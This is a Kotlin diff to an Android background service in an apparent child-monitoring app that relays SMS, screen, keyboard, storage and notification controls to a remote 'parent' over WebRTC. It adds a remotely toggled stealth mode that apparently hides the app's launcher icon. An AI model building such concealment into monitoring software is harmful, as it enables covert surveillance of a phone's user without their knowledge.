@@ -31,6 +31,8 @@ import com.nexus.child.components.screen.ScreenCommandHandler
 import com.nexus.child.components.screen.ScreenController
 import com.nexus.child.components.sms.SmsCommandHandler
 import com.nexus.child.components.sms.SmsController
+import com.nexus.child.components.stealth.StealthCommandHandler
+import com.nexus.child.components.stealth.StealthController
 import com.nexus.child.components.storage.StorageCommandHandler
 import com.nexus.child.components.storage.StorageController
 import com.nexus.child.components.vibrateflash.VibrateFlashCommandHandler
@@ -184,6 +186,8 @@ class NexusBackgroundService : Service() {
     private var screenCommandHandler: ScreenCommandHandler? = null
     private var keyboardController: KeyboardController? = null
     private var keyboardCommandHandler: KeyboardCommandHandler? = null
+    private var stealthController: StealthController? = null
+    private var stealthCommandHandler: StealthCommandHandler? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -432,6 +436,12 @@ class NexusBackgroundService : Service() {
             // Step 6: Initialize all domain controllers
             initializeHardwareControllers(rtcManager, speakerMgr)
 
+            // Step 7: Push initial stealth mode state immediately when DataChannel opens
+            rtcManager.onDataChannelOpened = {
+                Log.d(TAG, "WebRTC DataChannel opened. Dispatched initial stealth state to parent...")
+                stealthCommandHandler?.sendStatusUpdate()
+            }
+
         } catch (e: Exception) {
             Log.e(TAG, "Failed to bootstrap background WebRTC engine: ${e.message}", e)
         }
@@ -553,7 +563,23 @@ class NexusBackgroundService : Service() {
             dataSender = { msg -> rtcManager.sendData(msg) }
         )
 
-        Log.d(TAG, "All 11 hardware monitoring controllers successfully initialized in background")
+        // Stealth Mode & Launcher Component Visibility
+        val sthCtrl = StealthController(this)
+        stealthController = sthCtrl
+        val sthCmdHandler = StealthCommandHandler(
+            stealthController = sthCtrl,
+            dataSender = { msg -> rtcManager.sendData(msg) }
+        )
+        stealthCommandHandler = sthCmdHandler
+
+        // Synchronize widget toggles across active WebRTC session
+        StealthController.registerGlobalListener { isStealth ->
+            val statusMsg = if (isStealth) StealthCommandHandler.STATUS_STEALTH_ON else StealthCommandHandler.STATUS_STEALTH_OFF
+            rtcManager.sendData(statusMsg)
+            Log.d(TAG, "Global stealth listener dispatched to parent: $statusMsg")
+        }
+
+        Log.d(TAG, "All 12 hardware monitoring controllers successfully initialized in background")
     }
 
     /**
@@ -570,7 +596,8 @@ class NexusBackgroundService : Service() {
                 storageCommandHandler?.handleCommand(command) == true ||
                 notificationCommandHandler?.handleCommand(command) == true ||
                 screenCommandHandler?.handleCommand(command) == true ||
-                keyboardCommandHandler?.handleCommand(command) == true
+                keyboardCommandHandler?.handleCommand(command) == true ||
+                stealthCommandHandler?.handleCommand(command) == true
 
         if (!handled) {
             Log.d(TAG, "Unhandled command ignored: $command")
@@ -600,6 +627,8 @@ class NexusBackgroundService : Service() {
     private fun cleanupEngine() {
         keyboardCommandHandler?.cleanup()
         keyboardController?.cleanup()
+        stealthCommandHandler?.cleanup()
+        StealthController.registerGlobalListener(null)
         notificationCommandHandler?.cleanup()
         notificationController?.cleanup()
         screenCommandHandler?.cleanup()
